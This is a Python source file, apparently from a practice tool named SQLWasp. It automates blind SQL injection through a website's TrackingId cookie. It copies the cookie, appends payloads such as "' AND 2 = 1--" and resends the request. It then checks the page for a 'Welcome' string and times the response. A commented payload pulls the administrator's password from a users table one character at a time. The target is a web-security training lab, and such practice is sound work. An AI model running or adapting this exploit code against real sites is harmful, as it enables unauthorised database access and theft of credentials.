#!/usr/bin/env python3.12
# cookie_injector_core.py
import logging
import sys
import time
from typing import Union

import requests
from requests.cookies import RequestsCookieJar
from rich.console import Console
from rich.markdown import Markdown

from SQLWasp.custom_errors import CookieInjectorGetResponseError
from SQLWasp.reverse_logger import ReverseLogger, filename_parser

# from SQLWasp.reverse_logger import log_error_and_raise_exception, log_error, log_info


url = "https://0a5e00c50439712a822bcb02009100e0.web-security-academy.net/product?productId=5"
# code = "' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a'--"
payload_char = "b"
confirm_bytes = b"Welcome"
cookiename = "TrackingId"
password_length = 20
# code = """' anD 1 = 1--"""
code = """' AND 2 = 1--"""

filename, log_filename = filename_parser(log_file_name=__file__)
rev_log = ReverseLogger(
    logger_name=filename,
    log_file_path=log_filename,
    logging_level=logging.INFO,
)


class CookieInjector:
    """
    The CookieInjector class captures the response from a GET request made to a given URL,
    scans it for a cookie of a given name, it copies all its attributes into a new cookie
    of an injected value. The value is injected with a user provided payload.
    """

    def __init__(self, target_url: str) -> None:
        """
        Instantiates the CookieInjector class
        :param target_url: URL to test for Cookie Injection.
        """
        self.c = Console()
        self.target_url = target_url
        self.confirmation_string = None
        self.cookie_name = None
        self.inject_code = None
        self.response = None
        self.cookies = None
        self.crafted_tracking_id_cookie_jar = None
        self.cookie_original_value = None
        self.cookie_injected_value = None
        self.cookie_original_domain = None
        self.cookie_original_path = None
        self.cookie_original_secure = None
        self.cookie_original_http_only = None
        self.get_request_response_time = None

    def get_response(self) -> None:
        """
        1st function called from 'self.run()'. Checks if 'self.cookies' is None, if it is,
        it just sends the request without cookies.
        Else, if the 'self.cookies' variable has been set (so the crafted request has been created),
        it sends the GET request with the 'cookies=' parameter set to 'self.cookies'.\n
        Raises CookieInjectorGetResponseError triggered by 'requests.RequestException'.
        :return: None. Sets the 'self.response' variable.
        """
        try:
            if self.cookies is not None:
                # self.c.print(f"Cookies None: {self.cookies is None}.")
                self.response = requests.get(self.target_url, cookies=self.cookies)
                # info_message = f"Status code: {self.response.status_code}"
                # log_info(rev_log, info_message, inspect.currentframe().f_lineno)
                self.cookies = None
            else:
                # self.c.print(f"Cookies None: {self.cookies is None}.")
                self.response = requests.get(self.target_url)
                # info_message = f"Status code: {self.response.status_code}"
                # log_info(rev_log, info_message, inspect.currentframe().f_lineno)
        except requests.RequestException as e:
            error_message = f"Error sending the request: {e}"
            raise CookieInjectorGetResponseError(error_message)

    def print_cookies(self):
        self.c.print(self.cookies)

    def extract_cookies(self, print_cookies=False) -> None:
        """
        2nd function called from 'self.run()'. Sets the 'self.cookies' variable to 'self.response.cookies'.
        :param print_cookies:
        :return: None
        """
        self.cookies = self.response.cookies
        if print_cookies:
            self.print_cookies()

    def copy_cookie(self) -> None:
        """
        3rd method called by 'self.run()'.
        Here is where the code is injected. Copies the cookie's
        attributes to several instance variables.
        Sets the following: \n
        Instance variables set:
            - self.cookie_original_value
            - self.cookie_injected_value
            - self.cookie_original_domain
            - self.cookie_original_path
            - self.cookie_original_secure
            - self.cookie_original_http_only
        :return: None
        """
        # self.c.print(f"Creating cookie....{self.cookie_name}, {self.inject_code}"),
        for cookie in self.cookies:
            # self.c.print(
            #     f"Self Inject code strip in copy cookie: {cookie.name}{self.inject_code.strip()}",
            #     f"{__file__} Line n.\\[{inspect.currentframe().f_lineno}]"
            # )
            if cookie.name == self.cookie_name:
                self.cookie_original_value = cookie.value
                # self.c.print(
                #     f"Self Inject code strip in copy cookie: {cookie.name}{self.inject_code.strip()}",
                #     f"{__file__} Line n.\\[{inspect.currentframe().f_lineno}]"
                # )
                self.cookie_injected_value = self.cookie_original_value + self.inject_code.strip()
                # self.c.print(
                #     f"Self Cookie Injected Value: {self.cookie_injected_value}",
                #     f"{__file__} Line n.\\[{inspect.currentframe().f_lineno}]"
                # )
                self.cookie_original_domain = cookie.domain
                self.cookie_original_path = cookie.path
                self.cookie_original_secure = cookie.secure
                self.cookie_original_http_only = cookie.has_nonstandard_attr('HttpOnly')

    def delete_original_cookie(self) -> None:
        """
        5th called by 'self.update_original_cookie_jar'. Deletes original cookie in the original
        'RequestsCookieJar', searching it in the container by the name provided when instantiating
         the class, and stored in 'self.cookie_name'.
        :return: None
        """
        del self.cookies[self.cookie_name]

    def create_injected_cookie(self) -> None:
        """
        6th called by 'self.update_original_cookie_jar'. Creates a completely new instance
        of RequestsCookieJar, and updates it with a cookie called 'self.cookie_name', with
        the value of 'self.inject_code', plus all the attributes that were set in the original cookie.
        :return:
        """
        # self.c.print(self.cookie_injected_value)
        self.crafted_tracking_id_cookie_jar = RequestsCookieJar()
        self.crafted_tracking_id_cookie_jar.set(
            self.cookie_name,
            self.cookie_injected_value,
            domain=self.cookie_original_domain,
            path=self.cookie_original_path,
            secure=self.cookie_original_secure,
        )
        for tracking_id_cookie in self.crafted_tracking_id_cookie_jar:
            tracking_id_cookie.set_nonstandard_attr('HttpOnly', str(self.cookie_original_http_only))
        # self.c.print(
        #     self.crafted_tracking_id_cookie_jar,  # f"{__file__} Line n.\\[{inspect.currentframe().f_lineno}]"
        # )

    def update_original_cookie_jar(self) -> None:
        """
        4th method called by 'self.run'. It deletes the original 'self.cookie_name'
        in the original 'RequestsCookieJar' calling the 'self.delete_original_cookie'
        method. Then it calls the 'self.create_injected_cookie' method which creates an
        entirely new 'RequestsCookieJar' with the injected cookie (created with the
        parameters of the original cookie plus the injected code). Finally, it updates
        the original 'RequestsCookieJar' with the newly created one.
        :return: None. Updates the original RequestsCookieJar 'self.cookies', with the
        values in 'self.crafted_tracking_id_cookie_jar'.
        """
        self.delete_original_cookie()
        self.create_injected_cookie()
        self.cookies.update(self.crafted_tracking_id_cookie_jar)

    def check_response(self) -> bool:
        """

        :return: True if the confirmation string is found in the response from the crafted
        request send by 'self.get_crafted_request_response'. Else it returns False.
        """
        if self.confirmation_string in self.response.content:
            # self.c.print(self.response, True)
            return True
        else:
            # self.c.print(self.response, False)
            return False

    def get_crafted_request_response(self):
        self.get_response()
        # return self.check_response()

    def run(self, inject_code: str, cookie_name: str, confirmation_string: Union[str, bytes] = None) -> None:
        """
        This method represents the whole workflow of the 'CookieInjector' class. It calls the different
        methods in order from sending the GET request to injecting the cookies and matching the 'CONFIRMATION_STRING'
        on the result page.
        :param inject_code: The string of code that will be injected, concatenated to the original cookie value.
        :param confirmation_string: The string that will need to be matched for the injection to have worked.
        :param cookie_name: The name of the cookie that will be searched for in the response, and that will
        be injected and sent back.
        :return: None
        """
        # self.confirmation_string = confirmation_string
        self.cookie_name = cookie_name
        self.inject_code = inject_code
        # self.c.print(f"Core injector inject code: {self.inject_code}, cookie {self.cookie_name}")
        # self.passwd_length = passwd_length
        # self.payload = payload
        try:
            self.get_response()
            self.extract_cookies()
            self.copy_cookie()
            self.update_original_cookie_jar()
            # self.c.print(f"Core injector inject code: {self.cookie_injected_value}, cookie {self.cookie_name}")
            # self.c.print("Crafted JAR:", self.crafted_tracking_id_cookie_jar)
            # if confirmation_string:
            requests_sent_time = time.time()
            self.get_crafted_request_response()
            response_arrived_time = time.time()
            self.get_request_response_time = response_arrived_time -requests_sent_time
            # return self.get_crafted_request_response()
        except CookieInjectorGetResponseError as e:
            error_message = f"Request error: {e}."
            self.c.print(error_message)
            sys.exit(1)
        except KeyboardInterrupt:
            print()
            self.c.print("", Markdown("\\[•] Detected CTRL+C. Quitting. \n- Bye."), style="red")
            sys.exit(0)


def main():
    cookie_injector = CookieInjector(url)
    Console().print(cookie_injector.run(code, cookiename, confirm_bytes))
    # Console().print(cookie_injector.run(code, password_length, payload_char))


if __name__ == '__main__':
    main()
